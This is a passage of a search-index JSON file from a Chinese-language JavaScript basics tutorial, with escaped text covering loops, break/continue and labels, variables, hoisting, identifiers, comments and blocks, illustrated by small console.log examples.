'Hello World' ); } \u4e0a\u9762\u4ee3\u7801\u7701\u7565\u4e86 for \u8bed\u53e5\u8868\u8fbe\u5f0f\u7684\u4e09\u4e2a\u90e8\u5206\uff0c\u7ed3\u679c\u5c31\u5bfc\u81f4\u4e86\u4e00\u4e2a\u65e0\u9650\u5faa\u73af\u3002 do...while \u5faa\u73af \u00b6 do...while \u5faa\u73af\u4e0e while \u5faa\u73af\u7c7b\u4f3c\uff0c\u552f\u4e00\u7684\u533a\u522b\u5c31\u662f\u5148\u8fd0\u884c\u4e00\u6b21\u5faa\u73af\u4f53\uff0c\u7136\u540e\u5224\u65ad\u5faa\u73af\u6761\u4ef6\u3002 1 2 3 4 5 6 7 8 do \u8bed\u53e5 while ( \u6761\u4ef6 ); // \u6216\u8005 do { \u8bed\u53e5 } while ( \u6761\u4ef6 ); \u4e0d\u7ba1\u6761\u4ef6\u662f\u5426\u4e3a\u771f\uff0c do...while \u5faa\u73af\u81f3\u5c11\u8fd0\u884c\u4e00\u6b21\uff0c\u8fd9\u662f\u8fd9\u79cd\u7ed3\u6784\u6700\u5927\u7684\u7279\u70b9\u3002\u53e6\u5916\uff0c while \u8bed\u53e5\u540e\u9762\u7684\u5206\u53f7\u6ce8\u610f\u4e0d\u8981\u7701\u7565\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 var x = 3 ; var i = 0 ; do { console . log ( i ); i ++ ; } while ( i < x ); break \u8bed\u53e5\u548c continue \u8bed\u53e5 \u00b6 break \u8bed\u53e5\u548c continue \u8bed\u53e5\u90fd\u5177\u6709\u8df3\u8f6c\u4f5c\u7528\uff0c\u53ef\u4ee5\u8ba9\u4ee3\u7801\u4e0d\u6309\u65e2\u6709\u7684\u987a\u5e8f\u6267\u884c\u3002 break \u8bed\u53e5\u7528\u4e8e\u8df3\u51fa\u4ee3\u7801\u5757\u6216\u5faa\u73af\u3002 1 2 3 4 5 6 7 var i = 0 ; while ( i < 100 ) { console . log ( 'i \u5f53\u524d\u4e3a\uff1a' + i ); i ++ ; if ( i === 10 ) break ; } \u4e0a\u9762\u4ee3\u7801\u53ea\u4f1a\u6267\u884c10\u6b21\u5faa\u73af\uff0c\u4e00\u65e6 i \u7b49\u4e8e10\uff0c\u5c31\u4f1a\u8df3\u51fa\u5faa\u73af\u3002 for \u5faa\u73af\u4e5f\u53ef\u4ee5\u4f7f\u7528 break \u8bed\u53e5\u8df3\u51fa\u5faa\u73af\u3002 1 2 3 4 5 6 7 8 9 for ( var i = 0 ; i < 5 ; i ++ ) { console . log ( i ); if ( i === 3 ) break ; } // 0 // 1 // 2 // 3 \u4e0a\u9762\u4ee3\u7801\u6267\u884c\u5230 i \u7b49\u4e8e3\uff0c\u5c31\u4f1a\u8df3\u51fa\u5faa\u73af\u3002 continue \u8bed\u53e5\u7528\u4e8e\u7acb\u5373\u7ec8\u6b62\u672c\u8f6e\u5faa\u73af\uff0c\u8fd4\u56de\u5faa\u73af\u7ed3\u6784\u7684\u5934\u90e8\uff0c\u5f00\u59cb\u4e0b\u4e00\u8f6e\u5faa\u73af\u3002 1 2 3 4 5 6 7 var i = 0 ; while ( i < 100 ){ i ++ ; if ( i % 2 === 0 ) continue ; console . log ( 'i \u5f53\u524d\u4e3a\uff1a' + i ); } \u4e0a\u9762\u4ee3\u7801\u53ea\u6709\u5728 i \u4e3a\u5947\u6570\u65f6\uff0c\u624d\u4f1a\u8f93\u51fa i \u7684\u503c\u3002\u5982\u679c i \u4e3a\u5076\u6570\uff0c\u5219\u76f4\u63a5\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5faa\u73af\u3002 \u5982\u679c\u5b58\u5728\u591a\u91cd\u5faa\u73af\uff0c\u4e0d\u5e26\u53c2\u6570\u7684 break \u8bed\u53e5\u548c continue \u8bed\u53e5\u90fd\u53ea\u9488\u5bf9\u6700\u5185\u5c42\u5faa\u73af\u3002 \u6807\u7b7e\uff08label\uff09 \u00b6 JavaScript \u8bed\u8a00\u5141\u8bb8\uff0c\u8bed\u53e5\u7684\u524d\u9762\u6709\u6807\u7b7e\uff08label\uff09\uff0c\u76f8\u5f53\u4e8e\u5b9a\u4f4d\u7b26\uff0c\u7528\u4e8e\u8df3\u8f6c\u5230\u7a0b\u5e8f\u7684\u4efb\u610f\u4f4d\u7f6e\uff0c\u6807\u7b7e\u7684\u683c\u5f0f\u5982\u4e0b\u3002 1 2 label : \u8bed\u53e5 \u6807\u7b7e\u53ef\u4ee5\u662f\u4efb\u610f\u7684\u6807\u8bc6\u7b26\uff0c\u4f46\u4e0d\u80fd\u662f\u4fdd\u7559\u5b57\uff0c\u8bed\u53e5\u90e8\u5206\u53ef\u4ee5\u662f\u4efb\u610f\u8bed\u53e5\u3002 \u6807\u7b7e\u901a\u5e38\u4e0e break \u8bed\u53e5\u548c continue \u8bed\u53e5\u914d\u5408\u4f7f\u7528\uff0c\u8df3\u51fa\u7279\u5b9a\u7684\u5faa\u73af\u3002 1 2 3 4 5 6 7 8 9 10 11 top : for ( var i = 0 ; i < 3 ; i ++ ){ for ( var j = 0 ; j < 3 ; j ++ ){ if ( i === 1 && j === 1 ) break top ; console . log ( 'i=' + i + ', j=' + j ); } } // i=0, j=0 // i=0, j=1 // i=0, j=2 // i=1, j=0 \u4e0a\u9762\u4ee3\u7801\u4e3a\u4e00\u4e2a\u53cc\u91cd\u5faa\u73af\u533a\u5757\uff0c break \u547d\u4ee4\u540e\u9762\u52a0\u4e0a\u4e86 top \u6807\u7b7e\uff08\u6ce8\u610f\uff0c top \u4e0d\u7528\u52a0\u5f15\u53f7\uff09\uff0c\u6ee1\u8db3\u6761\u4ef6\u65f6\uff0c\u76f4\u63a5\u8df3\u51fa\u53cc\u5c42\u5faa\u73af\u3002\u5982\u679c break \u8bed\u53e5\u540e\u9762\u4e0d\u4f7f\u7528\u6807\u7b7e\uff0c\u5219\u53ea\u80fd\u8df3\u51fa\u5185\u5c42\u5faa\u73af\uff0c\u8fdb\u5165\u4e0b\u4e00\u6b21\u7684\u5916\u5c42\u5faa\u73af\u3002 \u6807\u7b7e\u4e5f\u53ef\u4ee5\u7528\u4e8e\u8df3\u51fa\u4ee3\u7801\u5757\u3002 1 2 3 4 5 6 7 8 foo : { console . log ( 1 ); break foo ; console . log ( '\u672c\u884c\u4e0d\u4f1a\u8f93\u51fa' ); } console . log ( 2 ); // 1 // 2 \u4e0a\u9762\u4ee3\u7801\u6267\u884c\u5230 break foo \uff0c\u5c31\u4f1a\u8df3\u51fa\u533a\u5757\u3002 continue \u8bed\u53e5\u4e5f\u53ef\u4ee5\u4e0e\u6807\u7b7e\u914d\u5408\u4f7f\u7528\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 top : for ( var i = 0 ; i < 3 ; i ++ ){ for ( var j = 0 ; j < 3 ; j ++ ){ if ( i === 1 && j === 1 ) continue top ; console . log ( 'i=' + i + ', j=' + j ); } } // i=0, j=0 // i=0, j=1 // i=0, j=2 // i=1, j=0 // i=2, j=0 // i=2, j=1 // i=2, j=2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c continue \u547d\u4ee4\u540e\u9762\u6709\u4e00\u4e2a\u6807\u7b7e\u540d\uff0c\u6ee1\u8db3\u6761\u4ef6\u65f6\uff0c\u4f1a\u8df3\u8fc7\u5f53\u524d\u5faa\u73af\uff0c\u76f4\u63a5\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5916\u5c42\u5faa\u73af\u3002\u5982\u679c continue \u8bed\u53e5\u540e\u9762\u4e0d\u4f7f\u7528\u6807\u7b7e\uff0c\u5219\u53ea\u80fd\u8fdb\u5165\u4e0b\u4e00\u8f6e\u7684\u5185\u5c42\u5faa\u73af\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Axel Rauschmayer, A quick overview of JavaScript","title":"\u57fa\u672c\u8bed\u6cd5"},{"location":"basic/grammar/#javascript","text":"","title":"JavaScript \u7684\u57fa\u672c\u8bed\u6cd5"},{"location":"basic/grammar/#_1","text":"JavaScript \u7a0b\u5e8f\u7684\u6267\u884c\u5355\u4f4d\u4e3a\u884c\uff08line\uff09\uff0c\u4e5f\u5c31\u662f\u4e00\u884c\u4e00\u884c\u5730\u6267\u884c\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6bcf\u4e00\u884c\u5c31\u662f\u4e00\u4e2a\u8bed\u53e5\u3002 \u8bed\u53e5\uff08statement\uff09\u662f\u4e3a\u4e86\u5b8c\u6210\u67d0\u79cd\u4efb\u52a1\u800c\u8fdb\u884c\u7684\u64cd\u4f5c\uff0c\u6bd4\u5982\u4e0b\u9762\u5c31\u662f\u4e00\u884c\u8d4b\u503c\u8bed\u53e5\u3002 1 var a = 1 + 3 ; \u8fd9\u6761\u8bed\u53e5\u5148\u7528 var \u547d\u4ee4\uff0c\u58f0\u660e\u4e86\u53d8\u91cf a \uff0c\u7136\u540e\u5c06 1 + 3 \u7684\u8fd0\u7b97\u7ed3\u679c\u8d4b\u503c\u7ed9\u53d8\u91cf a \u3002 1 + 3 \u53eb\u505a\u8868\u8fbe\u5f0f\uff08expression\uff09\uff0c\u6307\u4e00\u4e2a\u4e3a\u4e86\u5f97\u5230\u8fd4\u56de\u503c\u7684\u8ba1\u7b97\u5f0f\u3002\u8bed\u53e5\u548c\u8868\u8fbe\u5f0f\u7684\u533a\u522b\u5728\u4e8e\uff0c\u524d\u8005\u4e3b\u8981\u4e3a\u4e86\u8fdb\u884c\u67d0\u79cd\u64cd\u4f5c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u9700\u8981\u8fd4\u56de\u503c\uff1b\u540e\u8005\u5219\u662f\u4e3a\u4e86\u5f97\u5230\u8fd4\u56de\u503c\uff0c\u4e00\u5b9a\u4f1a\u8fd4\u56de\u4e00\u4e2a\u503c\u3002\u51e1\u662f JavaScript \u8bed\u8a00\u4e2d\u9884\u671f\u4e3a\u503c\u7684\u5730\u65b9\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528\u8868\u8fbe\u5f0f\u3002\u6bd4\u5982\uff0c\u8d4b\u503c\u8bed\u53e5\u7684\u7b49\u53f7\u53f3\u8fb9\uff0c\u9884\u671f\u662f\u4e00\u4e2a\u503c\uff0c\u56e0\u6b64\u53ef\u4ee5\u653e\u7f6e\u5404\u79cd\u8868\u8fbe\u5f0f\u3002 \u8bed\u53e5\u4ee5\u5206\u53f7\u7ed3\u5c3e\uff0c\u4e00\u4e2a\u5206\u53f7\u5c31\u8868\u793a\u4e00\u4e2a\u8bed\u53e5\u7ed3\u675f\u3002\u591a\u4e2a\u8bed\u53e5\u53ef\u4ee5\u5199\u5728\u4e00\u884c\u5185\u3002 1 var a = 1 + 3 ; var b = 'abc' ; \u5206\u53f7\u524d\u9762\u53ef\u4ee5\u6ca1\u6709\u4efb\u4f55\u5185\u5bb9\uff0cJavaScript \u5f15\u64ce\u5c06\u5176\u89c6\u4e3a\u7a7a\u8bed\u53e5\u3002 1 ;;; \u4e0a\u9762\u7684\u4ee3\u7801\u5c31\u8868\u793a3\u4e2a\u7a7a\u8bed\u53e5\u3002 \u8868\u8fbe\u5f0f\u4e0d\u9700\u8981\u5206\u53f7\u7ed3\u5c3e\u3002\u4e00\u65e6\u5728\u8868\u8fbe\u5f0f\u540e\u9762\u6dfb\u52a0\u5206\u53f7\uff0c\u5219 JavaScript \u5f15\u64ce\u5c31\u5c06\u8868\u8fbe\u5f0f\u89c6\u4e3a\u8bed\u53e5\uff0c\u8fd9\u6837\u4f1a\u4ea7\u751f\u4e00\u4e9b\u6ca1\u6709\u4efb\u4f55\u610f\u4e49\u7684\u8bed\u53e5\u3002 1 2 1 + 3 ; 'abc' ; \u4e0a\u9762\u4e24\u884c\u8bed\u53e5\u53ea\u662f\u5355\u7eaf\u5730\u4ea7\u751f\u4e00\u4e2a\u503c\uff0c\u5e76\u6ca1\u6709\u4efb\u4f55\u5b9e\u9645\u7684\u610f\u4e49\u3002","title":"\u8bed\u53e5"},{"location":"basic/grammar/#_2","text":"","title":"\u53d8\u91cf"},{"location":"basic/grammar/#_3","text":"\u53d8\u91cf\u662f\u5bf9\u201c\u503c\u201d\u7684\u5177\u540d\u5f15\u7528\u3002\u53d8\u91cf\u5c31\u662f\u4e3a\u201c\u503c\u201d\u8d77\u540d\uff0c\u7136\u540e\u5f15\u7528\u8fd9\u4e2a\u540d\u5b57\uff0c\u5c31\u7b49\u540c\u4e8e\u5f15\u7528\u8fd9\u4e2a\u503c\u3002\u53d8\u91cf\u7684\u540d\u5b57\u5c31\u662f\u53d8\u91cf\u540d\u3002 1 var a = 1 ; \u4e0a\u9762\u7684\u4ee3\u7801\u5148\u58f0\u660e\u53d8\u91cf a \uff0c\u7136\u540e\u5728\u53d8\u91cf a \u4e0e\u6570\u503c1\u4e4b\u95f4\u5efa\u7acb\u5f15\u7528\u5173\u7cfb\uff0c\u79f0\u4e3a\u5c06\u6570\u503c1\u201c\u8d4b\u503c\u201d\u7ed9\u53d8\u91cf a \u3002\u4ee5\u540e\uff0c\u5f15\u7528\u53d8\u91cf\u540d a \u5c31\u4f1a\u5f97\u5230\u6570\u503c1\u3002\u6700\u524d\u9762\u7684 var \uff0c\u662f\u53d8\u91cf\u58f0\u660e\u547d\u4ee4\u3002\u5b83\u8868\u793a\u901a\u77e5\u89e3\u91ca\u5f15\u64ce\uff0c\u8981\u521b\u5efa\u4e00\u4e2a\u53d8\u91cf a \u3002 \u6ce8\u610f\uff0cJavaScript \u7684\u53d8\u91cf\u540d\u533a\u5206\u5927\u5c0f\u5199\uff0c A \u548c a \u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u53d8\u91cf\u3002 \u53d8\u91cf\u7684\u58f0\u660e\u548c\u8d4b\u503c\uff0c\u662f\u5206\u5f00\u7684\u4e24\u4e2a\u6b65\u9aa4\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u5c06\u5b83\u4eec\u5408\u5728\u4e86\u4e00\u8d77\uff0c\u5b9e\u9645\u7684\u6b65\u9aa4\u662f\u4e0b\u9762\u8fd9\u6837\u3002 1 2 var a ; a = 1 ; \u5982\u679c\u53ea\u662f\u58f0\u660e\u53d8\u91cf\u800c\u6ca1\u6709\u8d4b\u503c\uff0c\u5219\u8be5\u53d8\u91cf\u7684\u503c\u662f undefined \u3002 undefined \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u503c\uff0c\u8868\u793a\u201c\u65e0\u5b9a\u4e49\u201d\u3002 1 2 var a ; a // undefined \u5982\u679c\u53d8\u91cf\u8d4b\u503c\u7684\u65f6\u5019\uff0c\u5fd8\u4e86\u5199 var \u547d\u4ee4\uff0c\u8fd9\u6761\u8bed\u53e5\u4e5f\u662f\u6709\u6548\u7684\u3002 1 2 3 var a = 1 ; // \u57fa\u672c\u7b49\u540c a = 1 ; \u4f46\u662f\uff0c\u4e0d\u5199 var \u7684\u505a\u6cd5\uff0c\u4e0d\u5229\u4e8e\u8868\u8fbe\u610f\u56fe\uff0c\u800c\u4e14\u5bb9\u6613\u4e0d\u77e5\u4e0d\u89c9\u5730\u521b\u5efa\u5168\u5c40\u53d8\u91cf\uff0c\u6240\u4ee5\u5efa\u8bae\u603b\u662f\u4f7f\u7528 var \u547d\u4ee4\u58f0\u660e\u53d8\u91cf\u3002 \u5982\u679c\u4e00\u4e2a\u53d8\u91cf\u6ca1\u6709\u58f0\u660e\u5c31\u76f4\u63a5\u4f7f\u7528\uff0cJavaScript \u4f1a\u62a5\u9519\uff0c\u544a\u8bc9\u4f60\u53d8\u91cf\u672a\u5b9a\u4e49\u3002 1 2 x // ReferenceError: x is not defined \u4e0a\u9762\u4ee3\u7801\u76f4\u63a5\u4f7f\u7528\u53d8\u91cf x \uff0c\u7cfb\u7edf\u5c31\u62a5\u9519\uff0c\u544a\u8bc9\u4f60\u53d8\u91cf x \u6ca1\u6709\u58f0\u660e\u3002 \u53ef\u4ee5\u5728\u540c\u4e00\u6761 var \u547d\u4ee4\u4e2d\u58f0\u660e\u591a\u4e2a\u53d8\u91cf\u3002 1 var a , b ; JavaScript \u662f\u4e00\u79cd\u52a8\u6001\u7c7b\u578b\u8bed\u8a00\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53d8\u91cf\u7684\u7c7b\u578b\u6ca1\u6709\u9650\u5236\uff0c\u53d8\u91cf\u53ef\u4ee5\u968f\u65f6\u66f4\u6539\u7c7b\u578b\u3002 1 2 var a = 1 ; a = 'hello' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf a \u8d77\u5148\u88ab\u8d4b\u503c\u4e3a\u4e00\u4e2a\u6570\u503c\uff0c\u540e\u6765\u53c8\u88ab\u91cd\u65b0\u8d4b\u503c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u7b2c\u4e8c\u6b21\u8d4b\u503c\u7684\u65f6\u5019\uff0c\u56e0\u4e3a\u53d8\u91cf a \u5df2\u7ecf\u5b58\u5728\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u4f7f\u7528 var \u547d\u4ee4\u3002 \u5982\u679c\u4f7f\u7528 var \u91cd\u65b0\u58f0\u660e\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u53d8\u91cf\uff0c\u662f\u65e0\u6548\u7684\u3002 1 2 3 var x = 1 ; var x ; x // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf x \u58f0\u660e\u4e86\u4e24\u6b21\uff0c\u7b2c\u4e8c\u6b21\u58f0\u660e\u662f\u65e0\u6548\u7684\u3002 \u4f46\u662f\uff0c\u5982\u679c\u7b2c\u4e8c\u6b21\u58f0\u660e\u7684\u65f6\u5019\u8fd8\u8fdb\u884c\u4e86\u8d4b\u503c\uff0c\u5219\u4f1a\u8986\u76d6\u6389\u524d\u9762\u7684\u503c\u3002 1 2 3 4 5 6 7 8 var x = 1 ; var x = 2 ; // \u7b49\u540c\u4e8e var x = 1 ; var x ; x = 2 ;","title":"\u6982\u5ff5"},{"location":"basic/grammar/#_4","text":"JavaScript \u5f15\u64ce\u7684\u5de5\u4f5c\u65b9\u5f0f\u662f\uff0c\u5148\u89e3\u6790\u4ee3\u7801\uff0c\u83b7\u53d6\u6240\u6709\u88ab\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u7136\u540e\u518d\u4e00\u884c\u4e00\u884c\u5730\u8fd0\u884c\u3002\u8fd9\u9020\u6210\u7684\u7ed3\u679c\uff0c\u5c31\u662f\u6240\u6709\u7684\u53d8\u91cf\u7684\u58f0\u660e\u8bed\u53e5\uff0c\u90fd\u4f1a\u88ab\u63d0\u5347\u5230\u4ee3\u7801\u7684\u5934\u90e8\uff0c\u8fd9\u5c31\u53eb\u505a\u53d8\u91cf\u63d0\u5347\uff08hoisting\uff09\u3002 1 2 console . log ( a ); var a = 1 ; \u4e0a\u9762\u4ee3\u7801\u9996\u5148\u4f7f\u7528 console.log \u65b9\u6cd5\uff0c\u5728\u63a7\u5236\u53f0\uff08console\uff09\u663e\u793a\u53d8\u91cf a \u7684\u503c\u3002\u8fd9\u65f6\u53d8\u91cf a \u8fd8\u6ca1\u6709\u58f0\u660e\u548c\u8d4b\u503c\uff0c\u6240\u4ee5\u8fd9\u662f\u4e00\u79cd\u9519\u8bef\u7684\u505a\u6cd5\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u4e0d\u4f1a\u62a5\u9519\u3002\u56e0\u4e3a\u5b58\u5728\u53d8\u91cf\u63d0\u5347\uff0c\u771f\u6b63\u8fd0\u884c\u7684\u662f\u4e0b\u9762\u7684\u4ee3\u7801\u3002 1 2 3 var a ; console . log ( a ); a = 1 ; \u6700\u540e\u7684\u7ed3\u679c\u662f\u663e\u793a undefined \uff0c\u8868\u793a\u53d8\u91cf a \u5df2\u58f0\u660e\uff0c\u4f46\u8fd8\u672a\u8d4b\u503c\u3002","title":"\u53d8\u91cf\u63d0\u5347"},{"location":"basic/grammar/#_5","text":"\u6807\u8bc6\u7b26\uff08identifier\uff09\u6307\u7684\u662f\u7528\u6765\u8bc6\u522b\u5404\u79cd\u503c\u7684\u5408\u6cd5\u540d\u79f0\u3002\u6700\u5e38\u89c1\u7684\u6807\u8bc6\u7b26\u5c31\u662f\u53d8\u91cf\u540d\uff0c\u4ee5\u53ca\u540e\u9762\u8981\u63d0\u5230\u7684\u51fd\u6570\u540d\u3002JavaScript \u8bed\u8a00\u7684\u6807\u8bc6\u7b26\u5bf9\u5927\u5c0f\u5199\u654f\u611f\uff0c\u6240\u4ee5 a \u548c A \u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u6807\u8bc6\u7b26\u3002 \u6807\u8bc6\u7b26\u6709\u4e00\u5957\u547d\u540d\u89c4\u5219\uff0c\u4e0d\u7b26\u5408\u89c4\u5219\u7684\u5c31\u662f\u975e\u6cd5\u6807\u8bc6\u7b26\u3002JavaScript \u5f15\u64ce\u9047\u5230\u975e\u6cd5\u6807\u8bc6\u7b26\uff0c\u5c31\u4f1a\u62a5\u9519\u3002 \u7b80\u5355\u8bf4\uff0c\u6807\u8bc6\u7b26\u547d\u540d\u89c4\u5219\u5982\u4e0b\u3002 \u7b2c\u4e00\u4e2a\u5b57\u7b26\uff0c\u53ef\u4ee5\u662f\u4efb\u610f Unicode \u5b57\u6bcd\uff08\u5305\u62ec\u82f1\u6587\u5b57\u6bcd\u548c\u5176\u4ed6\u8bed\u8a00\u7684\u5b57\u6bcd\uff09\uff0c\u4ee5\u53ca\u7f8e\u5143\u7b26\u53f7\uff08 $ \uff09\u548c\u4e0b\u5212\u7ebf\uff08 _ \uff09\u3002 \u7b2c\u4e8c\u4e2a\u5b57\u7b26\u53ca\u540e\u9762\u7684\u5b57\u7b26\uff0c\u9664\u4e86 Unicode \u5b57\u6bcd\u3001\u7f8e\u5143\u7b26\u53f7\u548c\u4e0b\u5212\u7ebf\uff0c\u8fd8\u53ef\u4ee5\u7528\u6570\u5b57 0-9 \u3002 \u4e0b\u9762\u8fd9\u4e9b\u90fd\u662f\u5408\u6cd5\u7684\u6807\u8bc6\u7b26\u3002 1 2 3 4 arg0 _tmp $elem \u03c0 \u4e0b\u9762\u8fd9\u4e9b\u5219\u662f\u4e0d\u5408\u6cd5\u7684\u6807\u8bc6\u7b26\u3002 1 2 3 4 5 1 a // \u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e0d\u80fd\u662f\u6570\u5b57 23 // \u540c\u4e0a *** // \u6807\u8bc6\u7b26\u4e0d\u80fd\u5305\u542b\u661f\u53f7 a + b // \u6807\u8bc6\u7b26\u4e0d\u80fd\u5305\u542b\u52a0\u53f7 - d // \u6807\u8bc6\u7b26\u4e0d\u80fd\u5305\u542b\u51cf\u53f7\u6216\u8fde\u8bcd\u7ebf \u4e2d\u6587\u662f\u5408\u6cd5\u7684\u6807\u8bc6\u7b26\uff0c\u53ef\u4ee5\u7528\u4f5c\u53d8\u91cf\u540d\u3002 1 var \u4e34\u65f6\u53d8\u91cf = 1 ; JavaScript \u6709\u4e00\u4e9b\u4fdd\u7559\u5b57\uff0c\u4e0d\u80fd\u7528\u4f5c\u6807\u8bc6\u7b26\uff1aarguments\u3001break\u3001case\u3001catch\u3001class\u3001const\u3001continue\u3001debugger\u3001default\u3001delete\u3001do\u3001else\u3001enum\u3001eval\u3001export\u3001extends\u3001false\u3001finally\u3001for\u3001function\u3001if\u3001implements\u3001import\u3001in\u3001instanceof\u3001interface\u3001let\u3001new\u3001null\u3001package\u3001private\u3001protected\u3001public\u3001return\u3001static\u3001super\u3001switch\u3001this\u3001throw\u3001true\u3001try\u3001typeof\u3001var\u3001void\u3001while\u3001with\u3001yield\u3002","title":"\u6807\u8bc6\u7b26"},{"location":"basic/grammar/#_6","text":"\u6e90\u7801\u4e2d\u88ab JavaScript \u5f15\u64ce\u5ffd\u7565\u7684\u90e8\u5206\u5c31\u53eb\u505a\u6ce8\u91ca\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u5bf9\u4ee3\u7801\u8fdb\u884c\u89e3\u91ca\u3002JavaScript \u63d0\u4f9b\u4e24\u79cd\u6ce8\u91ca\u7684\u5199\u6cd5\uff1a\u4e00\u79cd\u662f\u5355\u884c\u6ce8\u91ca\uff0c\u7528 // \u8d77\u5934\uff1b\u53e6\u4e00\u79cd\u662f\u591a\u884c\u6ce8\u91ca\uff0c\u653e\u5728 /* \u548c */ \u4e4b\u95f4\u3002 1 2 3 4 5 6 7 // \u8fd9\u662f\u5355\u884c\u6ce8\u91ca /* \u8fd9\u662f \u591a\u884c \u6ce8\u91ca */ \u6b64\u5916\uff0c\u7531\u4e8e\u5386\u53f2\u4e0a JavaScript \u53ef\u4ee5\u517c\u5bb9 HTML \u4ee3\u7801\u7684\u6ce8\u91ca\uff0c\u6240\u4ee5 <!-- \u548c --> \u4e5f\u88ab\u89c6\u4e3a\u5408\u6cd5\u7684\u5355\u884c\u6ce8\u91ca\u3002 1 2 x = 1 ; <!-- x = 2 ; --> x = 3 ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ea\u6709 x = 1 \u4f1a\u6267\u884c\uff0c\u5176\u4ed6\u7684\u90e8\u5206\u90fd\u88ab\u6ce8\u91ca\u6389\u4e86\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c --> \u53ea\u6709\u5728\u884c\u9996\uff0c\u624d\u4f1a\u88ab\u5f53\u6210\u5355\u884c\u6ce8\u91ca\uff0c\u5426\u5219\u4f1a\u5f53\u4f5c\u6b63\u5e38\u7684\u8fd0\u7b97\u3002 1 2 3 4 5 6 7 function countdown ( n ) { while ( n --> 0 ) console . log ( n ); } countdown ( 3 ) // 2 // 1 // 0 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c n --> 0 \u5b9e\u9645\u4e0a\u4f1a\u5f53\u4f5c n-- > 0 \uff0c\u56e0\u6b64\u8f93\u51fa2\u30011\u30010\u3002","title":"\u6ce8\u91ca"},{"location":"basic/grammar/#_7","text":"JavaScript \u4f7f\u7528\u5927\u62ec\u53f7\uff0c\u5c06\u591a\u4e2a\u76f8\u5173\u7684\u8bed\u53e5\u7ec4\u5408\u5728\u4e00\u8d77\uff0c\u79f0\u4e3a\u201c\u533a\u5757\u201d\uff08block\uff09\u3002 \u5bf9\u4e8e var \u547d\u4ee4\u6765\u8bf4\uff0cJavaScript \u7684\u533a\u5757\u4e0d\u6784\u6210\u5355\u72ec\u7684\u4f5c\u7528\u57df\uff08scope\uff09\u3002 1 2 3 4 5 { var a = 1 ; } a // 1 \u4e0a\u9762\u4ee3\u7801\u5728\u533a\u5757\u5185\u90e8\uff0c\u4f7f\u7528 var \u547d\u4ee4\u58f0\u660e\u5e76\u8d4b\u503c\u4e86\u53d8\u91cf a \uff0c\u7136\u540e\u5728\u533a\u5757\u5916\u90e8\uff0c\u53d8\u91cf a \u4f9d\u7136\u6709\u6548\uff0c\u533a\u5757\u5bf9\u4e8e var \u547d\u4ee4\u4e0d\u6784\u6210\u5355\u72ec\u7684\u4f5c\u7528\u57df\uff0c\u4e0e\u4e0d\u4f7f\u7528\u533a\u5757\u7684\u60c5\u51b5\u6ca1\u6709\u4efb\u4f55\u533a\u522b\u3002\u5728 JavaScript \u8bed\u8a00\u4e2d\uff0c\u5355\u72ec\u4f7f\u7528\u533a\u5757\u5e76\u4e0d\u5e38\u89c1\uff0c\u533a\u5757\u5f80\u5f80\u7528\u6765\u6784\u6210\u5176\u4ed6\u66f4\u590d\u6742\u7684\u8bed\u6cd5\u7ed3\u6784\uff0c\u6bd4\u5982 for \u3001 if \u3001 while \u3001 function \u7b49\u3002","title":"\u533a\u5757"},{"location":"basic/grammar/#_8","text":"JavaScript \u63d0\u4f9b if \u7ed3\u6784\u548c switch \u7ed3\u6784\uff0c\u5b8c\u6210\u6761\u4ef6\u5224\u65ad\uff0c\u5373\u53ea\u6709\u6ee1\u8db3\u9884\u8bbe\u7684\u6761\u4ef6\uff0c\u624d\u4f1a\u6267\u884c\u76f8\u5e94\u7684\u8bed\u53e5\u3002","title":"\u6761\u4ef6\u8bed\u53e5"},{"location":"basic/grammar/#if","text":"if \u7ed3\u6784\u5148\u5224\u65ad\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u5e03\u5c14\u503c\uff0c\u7136\u540e\u6839\u636e\u5e03\u5c14\u503c\u7684\u771f\u4f2a\uff0c\u6267\u884c\u4e0d\u540c\u7684\u8bed\u53e5\u3002\u6240\u8c13\u5e03\u5c14\u503c\uff0c\u6307\u7684\u662f JavaScript \u7684\u4e24\u4e2a\u7279\u6b8a\u503c\uff0c true \u8868\u793a\u201c\u771f\u201d\uff0c false \u8868\u793a\u201c\u4f2a\u201d\u3002 1 2 3 4 5 if ( \u5e03\u5c14\u503c ) \u8bed\u53e5 ; // \u6216\u8005 if ( \u5e03\u5c14\u503c ) \u8bed\u53e5 ; \u4e0a\u9762\u662f if \u7ed3\u6784\u7684\u57fa\u672c\u5f62\u5f0f\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u201c\u5e03\u5c14\u503c\u201d\u5f80\u5f80\u7531\u4e00\u4e2a\u6761\u4ef6\u8868\u8fbe\u5f0f\u4ea7\u751f\u7684\uff0c\u5fc5\u987b\u653e\u5728\u5706\u62ec\u53f7\u4e2d\uff0c\u8868\u793a\u5bf9\u8868\u8fbe\u5f0f\u6c42\u503c\u3002\u5982\u679c\u8868\u8fbe\u5f0f\u7684\u6c42\u503c\u7ed3\u679c\u4e3a true 